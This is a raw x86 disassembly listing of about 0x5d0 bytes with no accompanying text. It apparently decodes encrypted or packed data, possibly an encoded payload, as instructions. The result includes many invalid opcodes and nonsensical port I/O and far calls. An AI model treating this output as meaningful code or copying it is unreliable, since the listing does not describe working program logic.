  401b88:	1d 6c 52 56 e1       	sbb    $0xe156526c,%eax
  401b8d:	24 3a                	and    $0x3a,%al
  401b8f:	8e 18                	mov    (%eax),%ds
  401b91:	3a 3a                	cmp    (%edx),%bh
  401b93:	66 e9 8b cc          	jmpw   0xe822
  401b97:	51                   	push   %ecx
  401b98:	68 64 65 38 33       	push   $0x33386564
  401b9d:	ad                   	lods   %ds:(%esi),%eax
  401b9e:	f9                   	stc
  401b9f:	33 e1                	xor    %ecx,%esp
  401ba1:	81 82 d2 68 66 3a 8e 	addl   $0x3a3a508e,0x3a6668d2(%edx)
  401ba8:	50 3a 3a 
  401bab:	66 3b 32             	cmp    (%edx),%si
  401bae:	6d                   	insl   (%dx),%es:(%edi)
  401baf:	dd 67 05             	frstor 0x5(%edi)
  401bb2:	81 06 e9 97 19 49    	addl   $0x491997e9,(%esi)
  401bb8:	68 64 b3 be 69       	push   $0x69beb364
  401bbd:	bc b3 a5 ae e1       	mov    $0xe1aea5b3,%esp
  401bc2:	c7                   	(bad)
  401bc3:	99                   	cltd
  401bc4:	96                   	xchg   %eax,%esi
  401bc5:	9b                   	fwait
  401bc6:	3a 0e                	cmp    (%esi),%cl
  401bc8:	e0 a8                	loopne 0x401b72
  401bca:	78 66                	js     0x401c32
  401bcc:	80 1b 67             	sbbb   $0x67,(%ebx)
  401bcf:	66 68 ed bf          	pushw  $0xbfed
  401bd3:	92                   	xchg   %eax,%edx
  401bd4:	97                   	xchg   %eax,%edi
  401bd5:	9a c5 eb ed a0 c5 98 	lcall  $0x98c5,$0xa0edebc5
  401bdc:	97                   	xchg   %eax,%edi
  401bdd:	34 d2                	xor    $0xd2,%al
  401bdf:	af                   	scas   %es:(%edi),%eax
  401be0:	93                   	xchg   %eax,%ebx
  401be1:	9b                   	fwait
  401be2:	c5 3f                	lds    (%edi),%edi
  401be4:	61                   	popa
  401be5:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401be6:	35 e2 95 62 3a       	xor    $0x3a6295e2,%eax
  401beb:	66 d0 80 56 66 68 93 	data16 rolb $1,-0x6c9799aa(%eax)
  401bf2:	d9 ef                	(bad)
  401bf4:	ed                   	in     (%dx),%eax
  401bf5:	d0 c5                	rol    $1,%ch
  401bf7:	98                   	cwtl
  401bf8:	97                   	xchg   %eax,%edi
  401bf9:	ed                   	in     (%dx),%eax
  401bfa:	f9                   	stc
  401bfb:	0c 68                	or     $0x68,%al
  401bfd:	8c 10                	mov    %ss,(%eax)
  401bff:	04 68                	add    $0x68,%al
  401c01:	64 d2 13             	rclb   %cl,%fs:(%ebx)
  401c04:	08 64 3a ef          	or     %ah,-0x11(%edx,%edi,1)
  401c08:	ed                   	in     (%dx),%eax
  401c09:	a8 c5                	test   $0xc5,%al
  401c0b:	98                   	cwtl
  401c0c:	97                   	xchg   %eax,%edi
  401c0d:	dc b1 4d 68 64 cd    	fdivl  -0x329b97b3(%ecx)
  401c13:	85 e1                	test   %esp,%ecx
  401c15:	e1 8a                	loope  0x401ba1
  401c17:	99                   	cltd
  401c18:	96                   	xchg   %eax,%esi
  401c19:	9b                   	fwait
  401c1a:	b3 a5                	mov    $0xa5,%bl
  401c1c:	97                   	xchg   %eax,%edi
  401c1d:	d1 f6                	shl    $1,%esi
  401c1f:	99                   	cltd
  401c20:	96                   	xchg   %eax,%esi
  401c21:	9b                   	fwait
  401c22:	b7 e3                	mov    $0xe3,%bh
  401c24:	ac                   	lods   %ds:(%esi),%al
  401c25:	9b                   	fwait
  401c26:	c4 99 38 8c 0b 9a    	les    -0x65f473c8(%ecx),%ebx
  401c2c:	97                   	xchg   %eax,%edi
  401c2d:	9b                   	fwait
  401c2e:	b9 a2 64 e7 07       	mov    $0x7e764a2,%ecx
  401c33:	ee                   	out    %al,(%dx)
  401c34:	fa                   	cli
  401c35:	26 3a 66 1c          	cmp    %es:0x1c(%esi),%ah
  401c39:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401c3a:	b3 be                	mov    $0xbe,%bl
  401c3c:	41                   	inc    %ecx
  401c3d:	bc b3 a5 e5 e1       	mov    $0xe1e5a5b3,%esp
  401c42:	da 99 96 9b 6a c7    	ficompl -0x3895646a(%ecx)
  401c48:	e0 f6                	loopne 0x401c40
  401c4a:	78 66                	js     0x401cb2
  401c4c:	38 ef                	cmp    %ch,%bh
  401c4e:	02 99 3f 2c b3 23    	add    0x23b32c3f(%ecx),%bl
  401c54:	94                   	xchg   %eax,%esp
  401c55:	6d                   	insl   (%dx),%es:(%edi)
  401c56:	fa                   	cli
  401c57:	13 ca                	adc    %edx,%ecx
  401c59:	e9 bf ba 97 9a       	jmp    0x9ad7d71d
  401c5e:	c5 36                	lds    (%esi),%esi
  401c60:	00 64 f7 24          	add    %ah,0x24(%edi,%esi,8)
  401c64:	68 ef bf 86 97       	push   $0x9786bfef
  401c69:	9a c5 36 e3 5c c5 72 	lcall  $0x72c5,$0x5ce336c5
  401c70:	55                   	push   %ebp
  401c71:	64 3a 66 68          	cmp    %fs:0x68(%esi),%ah
  401c75:	ed                   	in     (%dx),%eax
  401c76:	7f 9a                	jg     0x401c12
  401c78:	e1 bc                	loope  0x401c36
  401c7a:	3b be e1 a7 b9 1b    	cmp    0x1bb9a7e1(%esi),%edi
  401c80:	94                   	xchg   %eax,%esp
  401c81:	64 35 e3 38 62 3a    	fs xor $0x3a6238e3,%eax
  401c87:	66 d0 2b             	data16 shrb $1,(%ebx)
  401c8a:	1f                   	pop    %ds
  401c8b:	66 68 93 d9          	pushw  $0xd993
  401c8f:	ef                   	out    %eax,(%dx)
  401c90:	ed                   	in     (%dx),%eax
  401c91:	c8 c5 98 97          	enter  $0x98c5,$0x97
  401c95:	ed                   	in     (%dx),%eax
  401c96:	f9                   	stc
  401c97:	eb ed                	jmp    0x401c86
  401c99:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401c9a:	c5 98 97 34 9b ee    	lds    -0x1164cb69(%eax),%ebx
  401ca0:	fa                   	cli
  401ca1:	26 3a 36             	cmp    %es:(%esi),%dh
  401ca4:	e3 5c                	jecxz  0x401d02
  401ca6:	c5 31                	lds    (%ecx),%esi
  401ca8:	10 ed                	adc    %ch,%ch
  401caa:	7f 9a                	jg     0x401c46
  401cac:	61                   	popa
  401cad:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401cae:	35 e3 7a 62 3a       	xor    $0x3a627ae3,%eax
  401cb3:	66 00 24 b5 27 68 9b 	data16 add %ah,-0x706497d9(,%esi,4)
  401cba:	8f 
  401cbb:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  401cbc:	97                   	xchg   %eax,%edi
  401cbd:	9a c5 8e 23 9e c5 99 	lcall  $0x99c5,$0x9e238ec5
  401cc4:	eb a0                	jmp    0x401c66
  401cc6:	32 ef                	xor    %bh,%ch
  401cc8:	af                   	scas   %es:(%edi),%eax
  401cc9:	23 b3 db 90 9b c4    	and    -0x3b646f25(%ebx),%esi
  401ccf:	99                   	cltd
  401cd0:	e9 8f ab 37 68       	jmp    0x6877c864
  401cd5:	64 b1 e3             	fs mov $0xe3,%cl
  401cd8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401cd9:	9b                   	fwait
  401cda:	c4 99 cb 20 b5 24    	les    0x24b520cb(%ecx),%ebx
  401ce0:	68 e5 d1 a8 0e       	push   $0xea8d1e5
  401ce5:	64 3a eb             	fs cmp %bl,%ch
  401ce8:	ed                   	in     (%dx),%eax
  401ce9:	da c5                	fcmovb %st(5),%st
  401ceb:	98                   	cwtl
  401cec:	97                   	xchg   %eax,%edi
  401ced:	34 9b                	xor    $0x9b,%al
  401cef:	ee                   	out    %al,(%dx)
  401cf0:	fa                   	cli
  401cf1:	26 3a 36             	cmp    %es:(%esi),%dh
  401cf4:	e3 5c                	jecxz  0x401d52
  401cf6:	c5 31                	lds    (%ecx),%esi
  401cf8:	14 ed                	adc    $0xed,%al
  401cfa:	7f 9a                	jg     0x401c96
  401cfc:	61                   	popa
  401cfd:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401cfe:	35 e3 aa 61 3a       	xor    $0x3a61aae3,%eax
  401d03:	66 0e                	pushw  %cs
  401d05:	e7 87                	out    %eax,$0x87
  401d07:	d8 97 9a c5 66 67    	fcoms  0x6766c59a(%edi)
  401d0d:	e0 a3                	loopne 0x401cb2
  401d0f:	66 68 64 ba          	pushw  $0xba64
  401d13:	db 95 9b c4 99 68    	fistl  0x6899c49b(%ebp)
  401d19:	6b be c1 6d 64 3a 0c 	imul   $0xc,0x3a646dc1(%esi),%edi
  401d20:	69 0c c4 aa 2a 64 b7 	imul   $0xb7642aaa,(%esp,%eax,8),%ecx
  401d27:	e3 95                	jecxz  0x401cbe
  401d29:	9b                   	fwait
  401d2a:	c4 99 38 8c 33 91    	les    -0x6ecc73c8(%ecx),%ebx
  401d30:	97                   	xchg   %eax,%edi
  401d31:	9b                   	fwait
  401d32:	b9 a2 64 ed fd       	mov    $0xfded64a2,%ecx
  401d37:	00 e1                	add    %ah,%cl
  401d39:	d9 90 99 96 9b b3    	fsts   -0x4c646967(%eax)
  401d3f:	be 9f 87 b3 e3       	mov    $0xe3b3879f,%esi
  401d44:	cc                   	int3
  401d45:	9b                   	fwait
  401d46:	c4 99 e1 a7 35 d1    	les    -0x2eca581f(%ecx),%ebx
  401d4c:	ed                   	in     (%dx),%eax
  401d4d:	ce                   	into
  401d4e:	c5 98 97 59 c5 99    	lds    -0x663aa669(%eax),%ebx
  401d54:	68 64 4e 5e 67       	push   $0x675e4e64
  401d59:	d3 bf cc 97 9a c5    	sarl   %cl,-0x3a656834(%edi)
  401d5f:	26 38 e9             	es cmp %ch,%cl
  401d62:	bf 9b 97 9a c5       	mov    $0xc59a979b,%edi
  401d67:	36 00 24 b5 27 68 8c 	add    %ah,%ss:-0x2f7397d9(,%esi,4)
  401d6e:	d0 
  401d6f:	06                   	push   %es
  401d70:	68 64 35 d1 ed       	push   $0xedd13564
  401d75:	ce                   	into
  401d76:	c5 98 97 a2 3e 63    	lds    0x633ea297(%eax),%ebx
  401d7c:	28 eb                	sub    %ch,%bl
  401d7e:	7b 66                	jnp    0x401de6
  401d80:	68 e9 bf 9b 97       	push   $0x979bbfe9
  401d85:	9a c5 36 80 8d c6 99 	lcall  $0x99c6,$0x8d8036c5
  401d8c:	97                   	xchg   %eax,%edi
  401d8d:	e7 fe                	out    %eax,$0xfe
  401d8f:	76 d0                	jbe    0x401d61
  401d91:	14 73                	adc    $0x73,%al
  401d93:	66 68 93 d9          	pushw  $0xd993
  401d97:	ef                   	out    %eax,(%dx)
  401d98:	ed                   	in     (%dx),%eax
  401d99:	c4 c5 98 97          	(bad)
  401d9d:	ed                   	in     (%dx),%eax
  401d9e:	f9                   	stc
  401d9f:	a0 ed 99 c5 98       	mov    0x98c599ed,%al
  401da4:	97                   	xchg   %eax,%edi
  401da5:	64 d3 7d 6d          	sarl   %cl,%fs:0x6d(%ebp)
  401da9:	64 3a ef             	fs cmp %bh,%ch
  401dac:	b0 55                	mov    $0x55,%al
  401dae:	e2 ef                	loop   0x401d9f
  401db0:	ab                   	stos   %eax,%es:(%edi)
  401db1:	e9 bf be 97 9a       	jmp    0x9ad7dc75
  401db6:	c5 36                	lds    (%esi),%esi
  401db8:	e3 e1                	jecxz  0x401d9b
  401dba:	e6 99                	out    %al,$0x99
  401dbc:	96                   	xchg   %eax,%esi
  401dbd:	9b                   	fwait
  401dbe:	6a ed                	push   $0xffffffed
  401dc0:	50                   	push   %eax
  401dc1:	9b                   	fwait
  401dc2:	6d                   	insl   (%dx),%es:(%edi)
  401dc3:	3a e1                	cmp    %cl,%ah
  401dc5:	21 c6                	and    %eax,%esi
  401dc7:	6f                   	outsl  %ds:(%esi),(%dx)
  401dc8:	a8 6b                	test   $0x6b,%al
  401dca:	bf 91 6c 64 3a       	mov    $0x3a646c91,%edi
  401dcf:	eb ed                	jmp    0x401dbe
  401dd1:	dc c5                	fadd   %st,%st(5)
  401dd3:	98                   	cwtl
  401dd4:	97                   	xchg   %eax,%edi
  401dd5:	34 b1                	xor    $0xb1,%al
  401dd7:	e3 b0                	jecxz  0x401d89
  401dd9:	9b                   	fwait
  401dda:	c4 99 38 ef 02 99    	les    -0x66fd10c8(%ecx),%ebx
  401de0:	3f                   	aas
  401de1:	44                   	inc    %esp
  401de2:	b3 23                	mov    $0x23,%bl
  401de4:	94                   	xchg   %eax,%esp
  401de5:	ed                   	in     (%dx),%eax
  401de6:	e2 91                	loop   0x401d79
  401de8:	8b ed                	mov    %ebp,%ebp
  401dea:	bf ce 97 9a c5       	mov    $0xc59a97ce,%edi
  401def:	ef                   	out    %eax,(%dx)
  401df0:	ab                   	stos   %eax,%es:(%edi)
  401df1:	e7 47                	out    %eax,$0x47
  401df3:	9a 68 6b bf d9 6c 64 	lcall  $0x646c,$0xd9bf6b68
  401dfa:	3a e5                	cmp    %ch,%ah
  401dfc:	cd b0                	int    $0xb0
  401dfe:	c5 98 97 64 b3 be    	lds    -0x414c9b69(%eax),%ebx
  401e04:	59                   	pop    %ecx
  401e05:	bc b3 a5 eb c1       	mov    $0xc1eba5b3,%esp
  401e0a:	ea 99 96 9b 3a e5 d5 	ljmp   $0xd5e5,$0x3a9b9699
  401e11:	dc c5                	fadd   %st,%st(5)
  401e13:	98                   	cwtl
  401e14:	97                   	xchg   %eax,%edi
  401e15:	65 35 e8 c7 64 3a    	gs xor $0x3a64c7e8,%eax
  401e1b:	66 d0 f5             	data16 shl $1,%ch
  401e1e:	1b 66 68             	sbb    0x68(%esi),%esp
  401e21:	93                   	xchg   %eax,%ebx
  401e22:	d9 ef                	(bad)
  401e24:	ed                   	in     (%dx),%eax
  401e25:	e0 c5                	loopne 0x401dec
  401e27:	98                   	cwtl
  401e28:	97                   	xchg   %eax,%edi
  401e29:	ed                   	in     (%dx),%eax
  401e2a:	f9                   	stc
  401e2b:	00 af e1 a2 99 96    	add    %ch,-0x69665d1f(%edi)
  401e31:	9b                   	fwait
  401e32:	2d 66 af e1 9a       	sub    $0x9ae1af66,%eax
  401e37:	99                   	cltd
  401e38:	96                   	xchg   %eax,%esi
  401e39:	9b                   	fwait
  401e3a:	3b 66 68             	cmp    0x68(%esi),%esp
  401e3d:	64 b7 e3             	fs mov $0xe3,%bh
  401e40:	e0 9b                	loopne 0x401ddd
  401e42:	c4 99 38 e9 bf fe    	les    -0x14016c8(%ecx),%ebx
  401e48:	97                   	xchg   %eax,%edi
  401e49:	9a c5 36 e3 e1 e2 99 	lcall  $0x99e2,$0xe1e336c5
  401e50:	96                   	xchg   %eax,%esi
  401e51:	9b                   	fwait
  401e52:	6a ed                	push   $0xffffffed
  401e54:	58                   	pop    %eax
  401e55:	9b                   	fwait
  401e56:	6c                   	insb   (%dx),%es:(%edi)
  401e57:	7a e1                	jp     0x401e3a
  401e59:	bc 13 be e1 a7       	mov    $0xa7e1be13,%esp
  401e5e:	b7 e3                	mov    $0xe3,%bh
  401e60:	bc 9b c4 99 38       	mov    $0x3899c49b,%esp
  401e65:	0c 0a                	or     $0xa,%al
  401e67:	ab                   	stos   %eax,%es:(%edi)
  401e68:	2a 64 b1 e3          	sub    -0x1d(%ecx,%esi,4),%ah
  401e6c:	f8                   	clc
  401e6d:	9b                   	fwait
  401e6e:	c4 99 38 ef 02 99    	les    -0x66fd10c8(%ecx),%ebx
  401e74:	7c 59                	jl     0x401ecf
  401e76:	3a 66 68             	cmp    0x68(%esi),%ah
  401e79:	64 b3 23             	fs mov $0x23,%bl
  401e7c:	94                   	xchg   %eax,%esp
  401e7d:	6d                   	insl   (%dx),%es:(%edi)
  401e7e:	fa                   	cli
  401e7f:	69 ed 51 3e 66 68    	imul   $0x68663e51,%ebp,%ebp
  401e85:	e9 bf b6 97 9a       	jmp    0x9ad7d549
  401e8a:	c5 36                	lds    (%esi),%esi
  401e8c:	e3 e1                	jecxz  0x401e6f
  401e8e:	ee                   	out    %al,(%dx)
  401e8f:	99                   	cltd
  401e90:	96                   	xchg   %eax,%esi
  401e91:	9b                   	fwait
  401e92:	6a ed                	push   $0xffffffed
  401e94:	50                   	push   %eax
  401e95:	9b                   	fwait
  401e96:	ad                   	lods   %ds:(%esi),%eax
  401e97:	b6 68                	mov    $0x68,%dh
  401e99:	64 3a ef             	fs cmp %bh,%ch
  401e9c:	2d 98 33 a6 67       	sub    $0x67a63398,%eax
  401ea1:	e1 c5                	loope  0x401e68
  401ea3:	65 68 64 b7 e3 80    	gs push $0x80e3b764
  401ea9:	9b                   	fwait
  401eaa:	c4 99 38 ef bf b6    	les    -0x494010c8(%ecx),%ebx
  401eb0:	97                   	xchg   %eax,%edi
  401eb1:	9a c5 36 e3 5c c5 31 	lcall  $0x31c5,$0x5ce336c5
  401eb8:	50                   	push   %eax
  401eb9:	ed                   	in     (%dx),%eax
  401eba:	7f 9a                	jg     0x401e56
  401ebc:	e9 97 08 24 68       	jmp    0x68642758
  401ec1:	64 33 a6 1c 4f d3 d9 	xor    %fs:-0x262cb0e4(%esi),%esp
  401ec8:	6b 64 3a eb ed       	imul   $0xffffffed,-0x15(%edx,%edi,1),%esp
  401ecd:	8c c5                	mov    %es,%ebp
  401ecf:	98                   	cwtl
  401ed0:	97                   	xchg   %eax,%edi
  401ed1:	34 b1                	xor    $0xb1,%al
  401ed3:	e3 b4                	jecxz  0x401e89
  401ed5:	9b                   	fwait
  401ed6:	c4 99 38 ef 02 99    	les    -0x66fd10c8(%ecx),%ebx
  401edc:	3f                   	aas
  401edd:	5c                   	pop    %esp
  401ede:	b3 23                	mov    $0x23,%bl
  401ee0:	94                   	xchg   %eax,%esp
  401ee1:	ed                   	in     (%dx),%eax
  401ee2:	e2 57                	loop   0x401f3b
  401ee4:	b0 ed                	mov    $0xed,%al
  401ee6:	f9                   	stc
  401ee7:	e5 15                	in     $0x15,%eax
  401ee9:	98                   	cwtl
  401eea:	3a 69 ed             	cmp    -0x13(%ecx),%ch
  401eed:	ad                   	lods   %ds:(%esi),%eax
  401eee:	39 66 68             	cmp    %esp,0x68(%esi)
  401ef1:	e5 c9                	in     $0xc9,%eax
  401ef3:	9a 78 64 3a eb ed 80 	lcall  $0x80ed,$0xeb3a6478
  401efa:	c5 98 97 34 b1 e3    	lds    -0x1c4ecb69(%eax),%ebx
  401f00:	80 9b c4 99 38 ef 02 	sbbb   $0x2,-0x10c7663c(%ebx)
  401f07:	99                   	cltd
  401f08:	3f                   	aas
  401f09:	40                   	inc    %eax
  401f0a:	b3 23                	mov    $0x23,%bl
  401f0c:	94                   	xchg   %eax,%esp
  401f0d:	6d                   	insl   (%dx),%es:(%edi)
  401f0e:	fa                   	cli
  401f0f:	69 ed 0d 39 66 68    	imul   $0x6866390d,%ebp,%ebp
  401f15:	e5 f9                	in     $0xf9,%eax
  401f17:	3e 27                	ds daa
  401f19:	64 3a e5             	fs cmp %ch,%ah
  401f1c:	cd 94                	int    $0x94
  401f1e:	c5 98 97 64 c5 d3    	lds    -0x2c3a9b69(%eax),%ebx
  401f24:	90                   	nop
  401f25:	9b                   	fwait
  401f26:	c4 99 00 24 b5 27    	les    0x27b52400(%ecx),%ebx
  401f2c:	68 e9 bf 9b 97       	push   $0x979bbfe9
  401f31:	9a c5 36 80 47 65 66 	lcall  $0x6665,$0x478036c5
  401f38:	68 e7 fe 6a eb       	push   $0xeb6afee7
  401f3d:	c1 d6 99             	rcl    $0x99,%esi
  401f40:	96                   	xchg   %eax,%esi
  401f41:	9b                   	fwait
  401f42:	3a 8f 7c 67 3a 66    	cmp    0x663a677c(%edi),%cl
  401f48:	02 64 d2 bb          	add    -0x45(%edx,%edx,8),%ah
  401f4c:	36 64 3a de          	ss fs cmp %dh,%bl
  401f50:	b4 32                	mov    $0x32,%ah
  401f52:	3a 66 9f             	cmp    -0x61(%esi),%ah
  401f55:	87 b3 e3 ec 9b c4    	xchg   %esi,-0x3b64131d(%ebx)
  401f5b:	99                   	cltd
  401f5c:	e1 a7                	loope  0x401f05
  401f5e:	c5 d3 84             	(bad)
  401f61:	9b                   	fwait
  401f62:	c4 99 e5 e1 c7 99    	les    -0x66381e1b(%ecx),%ebx
  401f68:	96                   	xchg   %eax,%esi
  401f69:	9b                   	fwait
  401f6a:	6a 0e                	push   $0xe
  401f6c:	14 a8                	adc    $0xa8,%al
  401f6e:	78 66                	js     0x401fd6
  401f70:	e5 e1                	in     $0xe1,%eax
  401f72:	c7                   	(bad)
  401f73:	99                   	cltd
  401f74:	96                   	xchg   %eax,%esi
  401f75:	9b                   	fwait
  401f76:	6a 8e                	push   $0xffffff8e
  401f78:	40                   	inc    %eax
  401f79:	3b 3a                	cmp    (%edx),%edi
  401f7b:	66 eb a0             	data16 jmp 0x401f1e
  401f7e:	2e 00 af e1 b2 99 96 	add    %ch,%cs:-0x69664d1f(%edi)
  401f85:	9b                   	fwait
  401f86:	38 66 e3             	cmp    %ah,-0x1d(%esi)
  401f89:	e1 d6                	loope  0x401f61
  401f8b:	99                   	cltd
  401f8c:	96                   	xchg   %eax,%esi
  401f8d:	9b                   	fwait
  401f8e:	b3 e3                	mov    $0xe3,%bl
  401f90:	f8                   	clc
  401f91:	9b                   	fwait
  401f92:	c4 99 e5 e1 a2 99    	les    -0x665d1e1b(%ecx),%ebx
  401f98:	96                   	xchg   %eax,%esi
  401f99:	9b                   	fwait
  401f9a:	6a eb                	push   $0xffffffeb
  401f9c:	dd ec                	fucomp %st(4)
  401f9e:	c5 98 97 e7 d6 76    	lds    0x76d6e797(%eax),%ebx
  401fa4:	e1 83                	loope  0x401f29
  401fa6:	83 62 68 64          	andl   $0x64,0x68(%edx)
  401faa:	3a 95 cd e9 8f ee    	cmp    -0x11701633(%ebp),%dl
  401fb0:	97                   	xchg   %eax,%edi
  401fb1:	9a c5 e5 84 74 b3 81 	lcall  $0x81b3,$0x7484e5c5
  401fb8:	d1 60 3a             	shll   $1,0x3a(%eax)
  401fbb:	66 68 97 9f          	pushw  $0x9f97
  401fbf:	ed                   	in     (%dx),%eax
  401fc0:	d5 8c                	aad    $0x8c
  401fc2:	c5 98 97 33 b1 59    	lds    0x59b13397(%eax),%ebx
  401fc8:	97                   	xchg   %eax,%edi
  401fc9:	33 16                	xor    (%esi),%edx
  401fcb:	ef                   	out    %eax,(%dx)
  401fcc:	2d 98 82 c7 31       	sub    $0x31c78298,%eax
  401fd1:	64 3a 91 8b ed bf e6 	cmp    %fs:-0x19401275(%ecx),%dl
  401fd8:	97                   	xchg   %eax,%edi
  401fd9:	9a c5 ef ab e7 47 9a 	lcall  $0x9a47,$0xe7abefc5
  401fe0:	68 6b bf 09 6a       	push   $0x6a09bf6b
  401fe5:	64 3a e5             	fs cmp %ch,%ah
  401fe8:	cd c4                	int    $0xc4
  401fea:	c5 98 97 64 b7 e3    	lds    -0x1c489b69(%eax),%ebx
  401ff0:	c8 9b c4 99          	enter  $0xc49b,$0x99
  401ff4:	38 0c 1a             	cmp    %cl,(%edx,%ebx,1)
  401ff7:	ab                   	stos   %eax,%es:(%edi)
  401ff8:	2a 64 b1 e3          	sub    -0x1d(%ecx,%esi,4),%ah
  401ffc:	f0 9b                	lock fwait
  401ffe:	c4 99 38 ef 02 99    	les    -0x66fd10c8(%ecx),%ebx
  402004:	7c 59                	jl     0x40205f
  402006:	3a 66 68             	cmp    0x68(%esi),%ah
  402009:	64 b3 23             	fs mov $0x23,%bl
  40200c:	94                   	xchg   %eax,%esp
  40200d:	6d                   	insl   (%dx),%es:(%edi)
  40200e:	fa                   	cli
  40200f:	69 ed 4d 38 66 68    	imul   $0x6866384d,%ebp,%ebp
  402015:	e5 f9                	in     $0xf9,%eax
  402017:	54                   	push   %esp
  402018:	5d                   	pop    %ebp
  402019:	64 3a eb             	fs cmp %bl,%ch
  40201c:	ed                   	in     (%dx),%eax
  40201d:	f8                   	clc
  40201e:	c5 98 97 34 b1 e3    	lds    -0x1c4ecb69(%eax),%ebx
  402024:	c8 9b c4 99          	enter  $0xc49b,$0x99
  402028:	38 ef                	cmp    %ch,%bh
  40202a:	02 99 3f 08 b3 23    	add    0x23b3083f(%ecx),%bl
  402030:	94                   	xchg   %eax,%esp
  402031:	6d                   	insl   (%dx),%es:(%edi)
  402032:	fa                   	cli
  402033:	69 ed 9d 3b 66 68    	imul   $0x68663b9d,%ebp,%ebp
  402039:	e7 9f                	out    %eax,$0x9f
  40203b:	c2 97 9a             	ret    $0x9a97
  40203e:	c5 66 81             	lds    -0x7f(%esi),%esp
  402041:	bf 3b 66 68 0e       	mov    $0xe68663b,%edi
  402046:	3a 8e 88 39 3a 66    	cmp    0x663a3988(%esi),%cl
  40204c:	31 ed                	xor    %ebp,%ebp
  40204e:	e2 67                	loop   0x4020b7
  402050:	b0 ed                	mov    $0xed,%al
  402052:	f9                   	stc
  402053:	00 af e1 52 99 96    	add    %ch,-0x6966ad1f(%edi)
  402059:	9b                   	fwait
  40205a:	38 66 e3             	cmp    %ah,-0x1d(%esi)
  40205d:	e1 9e                	loope  0x401ffd
  40205f:	99                   	cltd
  402060:	96                   	xchg   %eax,%esi
  402061:	9b                   	fwait
  402062:	b3 e3                	mov    $0xe3,%bl
  402064:	18 9b c4 99 e5 e1    	sbb    %bl,-0x1e1a663c(%ebx)
  40206a:	42                   	inc    %edx
  40206b:	99                   	cltd
  40206c:	96                   	xchg   %eax,%esi
  40206d:	9b                   	fwait
  40206e:	6a eb                	push   $0xffffffeb
  402070:	dd 0c c5 98 97 e7 d6 	fisttpll -0x29186868(,%eax,8)
  402077:	76 e1                	jbe    0x40205a
  402079:	83 83 62 68 64 3a 95 	addl   $0xffffff95,0x3a646862(%ebx)
  402080:	cd e9                	int    $0xe9
  402082:	8f                   	(bad)
  402083:	0e                   	push   %cs
  402084:	97                   	xchg   %eax,%edi
  402085:	9a c5 e5 84 74 b3 81 	lcall  $0x81b3,$0x7484e5c5
  40208c:	d1 60 3a             	shll   $1,0x3a(%eax)
  40208f:	66 68 97 9f          	pushw  $0x9f97
  402093:	ed                   	in     (%dx),%eax
  402094:	d5 c4                	aad    $0xc4
  402096:	c5 98 97 33 b1 59    	lds    0x59b13397(%eax),%ebx
  40209c:	97                   	xchg   %eax,%edi
  40209d:	33 4e ef             	xor    -0x11(%esi),%ecx
  4020a0:	2d 98 82 db 42       	sub    $0x42db8298,%eax
  4020a5:	64 3a 91 8b ed bf 32 	cmp    %fs:0x32bfed8b(%ecx),%dl
  4020ac:	97                   	xchg   %eax,%edi
  4020ad:	9a c5 ef ab e7 47 9a 	lcall  $0x9a47,$0xe7abefc5
  4020b4:	68 6b bf 39 69       	push   $0x6939bf6b
  4020b9:	64 3a e5             	fs cmp %ch,%ah
  4020bc:	cd 18                	int    $0x18
  4020be:	c5 98 97 64 b7 e3    	lds    -0x1c489b69(%eax),%ebx
  4020c4:	14 9b                	adc    $0x9b,%al
  4020c6:	c4 99 38 0c 2a ab    	les    -0x54d5f3c8(%ecx),%ebx
  4020cc:	2a 64 b1 e3          	sub    -0x1d(%ecx,%esi,4),%ah
  4020d0:	10 9b c4 99 38 ef    	adc    %bl,-0x10c7663c(%ebx)
  4020d6:	02 99 7c 59 3a 66    	add    0x663a597c(%ecx),%bl
  4020dc:	68 64 b3 23 94       	push   $0x9423b364
  4020e1:	6d                   	insl   (%dx),%es:(%edi)
  4020e2:	fa                   	cli
  4020e3:	69 ed 72 3b 66 68    	imul   $0x68663b72,%ebp,%ebp
  4020e9:	e7 87                	out    %eax,$0x87
  4020eb:	1a 97 9a c5 66 67    	sbb    0x6766c59a(%edi),%dl
  4020f1:	e0 33                	loopne 0x402126
  4020f3:	67 68 64 b7 e3 30    	addr16 push $0x30e3b764
  4020f9:	9b                   	fwait
  4020fa:	c4 99 38 0e 3a 99    	les    -0x66c5f1c8(%ecx),%ebx
  402100:	dd 90 c5 98 97 ef    	fstl   -0x1068673b(%eax)
  402106:	bf 1a 97 9a c5       	mov    $0xc59a971a,%edi
  40210b:	36 e3 5c             	ss jecxz 0x40216a
  40210e:	c5 31                	lds    (%ecx),%esi
  402110:	48                   	dec    %eax
  402111:	ed                   	in     (%dx),%eax
  402112:	7f 9a                	jg     0x4020ae
  402114:	e1 bc                	loope  0x4020d2
  402116:	cd 85                	int    $0x85
  402118:	e1 e1                	loope  0x4020fb
  40211a:	6a 99                	push   $0xffffff99
  40211c:	96                   	xchg   %eax,%esi
  40211d:	9b                   	fwait
  40211e:	b3 a5                	mov    $0xa5,%bl
  402120:	eb 19                	jmp    0x40213b
  402122:	c6                   	(bad)
  402123:	66 67 e1 ef          	data16 loopew 0x402116
  402127:	66 68 64 5c          	pushw  $0x5c64
  40212b:	e5 d5                	in     $0xd5,%eax
  40212d:	3c c5                	cmp    $0xc5,%al
  40212f:	98                   	cwtl
  402130:	97                   	xchg   %eax,%edi
  402131:	6c                   	insb   (%dx),%es:(%edi)
  402132:	35 e3 af 64 3a       	xor    $0x3a64afe3,%eax
  402137:	66 eb d9             	data16 jmp 0x402113
  40213a:	5a                   	pop    %edx
  40213b:	99                   	cltd
  40213c:	96                   	xchg   %eax,%esi
  40213d:	9b                   	fwait
  40213e:	3a 69 ec             	cmp    -0x14(%ecx),%ch
  402141:	de 3a                	fidivrs (%edx)
  402143:	66 68 e9 bf          	pushw  $0xbfe9
  402147:	37                   	aaa
  402148:	97                   	xchg   %eax,%edi
  402149:	99                   	cltd
  40214a:	c5 36                	lds    (%esi),%esi
  40214c:	97                   	xchg   %eax,%edi
  40214d:	d1 5a 99             	rcrl   $1,-0x67(%edx)
  402150:	96                   	xchg   %eax,%esi
  402151:	9b                   	fwait
  402152:	d2 de                	rcr    %cl,%dh
  402154:	9d                   	popf
  402155:	9b                   	fwait
  402156:	c5 e5 ac             	(bad)
